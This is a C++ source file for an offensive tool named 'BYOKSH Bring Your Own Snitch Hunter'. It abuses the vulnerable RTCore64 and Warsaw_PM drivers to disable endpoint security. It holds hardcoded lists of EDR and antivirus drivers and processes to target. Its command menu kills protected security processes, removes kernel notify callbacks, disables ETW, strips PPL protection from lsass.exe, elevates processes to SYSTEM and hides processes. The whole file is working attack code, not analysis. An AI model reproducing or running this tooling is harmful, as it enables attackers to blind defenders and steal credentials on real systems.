
#include "utils.h"



EZPDB pdb;
ULONG_PTR ntoskrnlBase;

int stop_term = 0;
HANDLE termDevice;

const char* monitoredDrivers[] = {
	"EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
	"srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
	"WdFilter.sys", "cbstream.sys", "atrsdfw.sys", "avgtpx86.sys",
	"avgtpx64.sys", "naswSP.sys", "ProcessSnitch.sys", "edrsensor.sys", "CarbonBlackK.sys",
	"parity.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys",
	"csaav.sys", "csaam.sys", "rvsavd.sys", "cfrmd.sys", "cmdccav.sys",
	"cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "im.sys", "csagent.sys",
	"CybKernelTracker.sys", "CRExecPrev.sys", "CyOptics.sys", "CyProtectDrv32.sys",
	"CyProtectDrv64.sys", "groundling32.sys", "groundling64.sys", "esensor.sys",
	"edevmon.sys", "ehdrv.sys", "FeKern.sys", "WFP_MRT.sys", "xfsgk.sys",
	"fsatp.sys", "fshs.sys", "HexisFSMonitor.sys", "klifks.sys", "klifaa.sys",
	"Klifsm.sys", "mbamwatchdog.sys", "mfeaskm.sys", "mfencfilter.sys",
	"PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys",
	"eaw.sys", "SAFE-Agent.sys", "SentinelMonitor.sys", "SAVOnAccess.sys",
	"savonaccess.sys", "sld.sys", "pgpwdefs.sys", "GEProtection.sys",
	"diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys",
	"spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "symevent.sys", "vxfsrep.sys",
	"VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys",
	"SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys",
	"fencry.sys", "symrg.sys", "ndgdmk.sys", "ssfmonm.sys", "SISIPSFileFilter.sys",
	"cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
};


const char* g_edrlist[] = {
	"activeconsole", "anti malware",    "anti-malware",
	"antimalware",   "anti virus",      "anti-virus",
	"antivirus",     "appsense",        "authtap",
	"avast",         "avecto",          "canary",
	"carbonblack",   "carbon black",    "cb.exe",
	"ciscoamp",      "cisco amp",       "countercept",
	"countertack",   "cramtray",        "crssvc",
	"crowdstrike",   "csagent",         "csfalcon",
	"csshell",       "cybereason",      "cyclorama",
	"cylance",       "cyoptics",        "cyupdate",
	"cyvera",        "cyserver",        "cytray",
	"darktrace",     "defendpoint",     "defender",
	"eectrl",        "elastic",         "endgame",
	"f-secure",      "forcepoint",      "fireeye",
	"groundling",    "GRRservic",       "inspector",
	"ivanti",        "kaspersky",       "lacuna",
	"logrhythm",     "malware",         "mandiant",
	"mcafee",        "morphisec",       "msascuil",
	"msmpeng",       "nissrv",          "omni",
	"omniagent",     "osquery",         "palo alto networks",
	"pgeposervice",  "pgsystemtray",    "privilegeguard",
	"procwall",      "protectorservic", "qradar",
	"redcloak",      "secureworks",     "securityhealthservice",
	"semlaunchsv",   "sentinel",        "sepliveupdat",
	"sisidsservice", "sisipsservice",   "sisipsutil",
	"smc.exe",       "smcgui",          "snac64",
	"sophos",        "splunk",          "srtsp",
	"symantec",      "symcorpu",        "symefasi",
	"sysinternal",   "sysmon",          "tanium",
	"tda.exe",       "tdawork",         "tpython",
	"vectra",        "wincollect",      "windowssensor",
	"wireshark",     "threat",          "xagt.exe",
	"xagtnotif.exe" ,"mssense" };



int main() {

	HANDLE hDeviceRW = CreateFile(
		L"\\\\.\\RTCore64",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	HANDLE hDeviceTerm =  CreateFile(
		L"\\\\.\\Warsaw_PM",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDeviceRW == INVALID_HANDLE_VALUE) {
		printf("Error opening handle to RW vuln drv.\n");
	}

	if (hDeviceTerm == INVALID_HANDLE_VALUE) {
		printf("Error opening handle to Terminator vuln drv.\n");
	}
	ntoskrnlBase = GetKernelBaseAddress();
	
	printf("Kernel base: %p\n", ntoskrnlBase);

	CHAR input[256];

	//printf("Downloading pdb files\n");
	printf("Do You want to download pdb or use local pdb file?\n");
	printf("[1] Download\n[2] Local file\n");
	printf("> ");

	fgets(input, 256, stdin);
	if (strncmp(input, "1", 1) == 0) {
		pdb = loadKernelOffsets();
	}
	else {
		std::string pdbPath;
		printf("Specify the path: ");
		std::cin >> pdbPath;
		pdb = loadKernelOffsetsWithPath(pdbPath);
	}




	printf("WELCOME TO BYOKSH Bring Your Own Snitch Hunter. type help to see options\n\n");

	while (1) {
		printf("> ");
		fgets(input, 256, stdin);
		//if (strncmp(input, "elproccallback", 14) == 0) {
		//	DeleteProcCallback(hDeviceRW);
		//}
		if (strncmp(input, "terminatem", 10) == 0) {
			stop_term = 0;
			termDevice = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, (LPVOID)hDeviceTerm, 0, NULL);
			if (termDevice == NULL) {
				fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
			}

		}
		else if (strncmp(input, "terminate", 9) == 0) {
			DWORD pid = atoi(input + 10);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			terminateProcess(hDeviceTerm, pid);
		}
		else if (strncmp(input, "stopterm", 8) == 0) {
			stop_term = 1;
		}
		else if (strncmp(input, "listproccallback", 16) == 0) {
			ListProcCallback(hDeviceRW);
		}
		else if (strncmp(input, "listthreadcallback", 18) == 0) {
			ListThreadCallback(hDeviceRW);
		}
		else if (strncmp(input, "listloadimagecallback", 21) == 0) {
			ListLoadImageCallback(hDeviceRW);
		}
		else if (strncmp(input, "listregcallback", 15) == 0) {
			ListRegCallback(hDeviceRW);
		}
		else if (strncmp(input, "listobjcallback", 15) == 0) {
			ListObjCallback(hDeviceRW);
		}

		else if (strncmp(input, "elproccallback", 14) == 0) {
			DeleteProcCallback(hDeviceRW);
		}
		else if (strncmp(input, "elthreadcallback", 16) == 0) {
			DeleteThreadCallback(hDeviceRW);
		}
		else if (strncmp(input, "elloadimagecallback", 19) == 0) {
			DeleteLoadImageCallback(hDeviceRW);
		}
		else if (strncmp(input, "elregcallback", 13) == 0) {
			DeleteRegCallback(hDeviceRW);
		}
		else if (strncmp(input, "elobjcallback", 13) == 0) {
			DeleteObjCallback(hDeviceRW);
		}
		else if (strncmp(input, "bypassppllsass", 14) == 0) {
			DWORD64 pid = FindProcessId("lsass.exe");
			BypassPpl(hDeviceRW, pid);
		}

		else if (strncmp(input, "bypassppl", 9) == 0) {
			DWORD pid = atoi(input + 10);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			BypassPpl(hDeviceRW, pid);
		}

		else if (strncmp(input, "elevateproc", 11) == 0) {
			DWORD pid = atoi(input + 12);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			elevateProc(hDeviceRW, pid);
		}
		else if (strncmp(input, "hideproc", 8) == 0) {
			DWORD pid = atoi(input + 9);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			hideProc(hDeviceRW, pid);
		}

		else if (strncmp(input, "disablewti", 10) == 0) {
			disableWTI(hDeviceRW);
		}
		else if (strncmp(input, "exit", 4) == 0) {
			exit(0);
		}
		else if (strncmp(input, "help", 4) == 0) {
			printf("Help menu:\n");

			printf(" - terminatem				- start terminator thread\n");
			printf(" - stopterm					- stop the terminator thread\n");
			printf(" - terminate <PID>			- Terminate process (even PPL) by PID\n");


			printf(" - listproccallback			- List process notify routines\n");
			printf(" - listthreadcallback		- List thread notify routines\n");
			printf(" - listloadimagecallback    - List load image notify routines\n");
			printf(" - listregcallback          - List registry notify routines \n");
			printf(" - listobjcallback          - List objects notify routines\n\n");
			//printf(" - listmf               - List Minifilter drivers (only KMDebug)\n\n");

			printf(" - elproccallback			- Eliminate process notify routine callback\n");
			printf(" - elthreadcallback			- Eliminate thread notify routine callback\n");
			printf(" - elloadimagecallback		- Eliminate load image notify routine callback\n");
			printf(" - elregcallback			- Eliminate registry notify routine callback\n");
			printf(" - elobjcallback			- Eliminate object notify routine callback\n\n");
			//printf(" - elmfcallback         - Eliminate MiniFilter notify callbacks\n");


			printf(" - disablewti				- disable ETW kernel provider\n");

			printf(" - bypassppl <PID>			- Bypass PPL for a specific process by PID\n");
			printf(" - bypassppllsass			- Bypass PPL for lsass.exe (Suggestion: Terminate EDR processes before)\n\n");

			printf(" - elevateproc <PID>		- Elevate a specific process by PID using local system\n");
			//printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");

			printf(" - hideproc <PID>			- Hide a specific process by PID\n");

			printf(" - help						- Show this help menu\n");
			printf(" - exit						- Exit the program\n");
		}
	}
}